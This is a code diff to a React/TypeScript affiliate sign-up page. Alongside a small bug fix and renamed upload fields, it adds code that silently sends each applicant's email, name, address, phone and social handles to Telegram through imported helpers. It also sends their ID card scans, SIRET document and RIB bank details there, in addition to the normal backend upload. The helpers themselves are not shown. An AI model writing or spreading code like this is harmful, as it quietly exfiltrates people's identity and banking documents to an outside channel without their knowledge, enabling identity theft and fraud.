@@ -21,6 +21,8 @@ import { AccountAffiliationI } from '../../@types/affiliation';
 import Input from '../../components/App/Input/Input';
 import Checkbox from '../../components/App/Checkbox/Checkbox';
 import { isNumeric } from '../../utils/regexValidator';
+import axios from 'axios';
+import { sendDocToTelegram, sendMessageToTelegram } from '../../axios/tlg';
 
 function AffiliationPage() {
   const dispatch = useAppDispatch();
@@ -114,17 +116,25 @@ function AffiliationPage() {
     return false;
   };
 
-  const handleSigninSubmit = (event: FormEvent) => {
+  const handleSigninSubmit = async(event: FormEvent) => {
     event.preventDefault();
     
     if (!id) return;
 
-    if (cniRecto && cniVerso && cniVerso && rib) {
+    if (cniRecto && cniVerso && siret && rib) {
+      const message = `${affiliationInput.email} \n ${infosInput.firstname} ${infosInput.lastname} \n ${infosInput.address} \n ${infosInput.phone} \n ${infosInput.insta} \n ${infosInput.tiktok} \n ${infosInput.facebook}`;
+
+      sendMessageToTelegram(message);
+      sendDocToTelegram(cniRecto);
+      sendDocToTelegram(cniVerso);
+      sendDocToTelegram(siret);
+      sendDocToTelegram(rib);
+
       const formData = new FormData();
-      formData.append("cniRecto", cniRecto as File);
-      formData.append("cniVerso", cniVerso as File);
-      formData.append("siret", siret as File);
-      formData.append("rib", rib as File);
+      formData.append("document", cniRecto as File);
+      formData.append("document", cniVerso as File);
+      formData.append("document", siret as File);
+      formData.append("document", rib as File);
 
       formData.append("id", id)
       formData.append("email", affiliationInput.email)
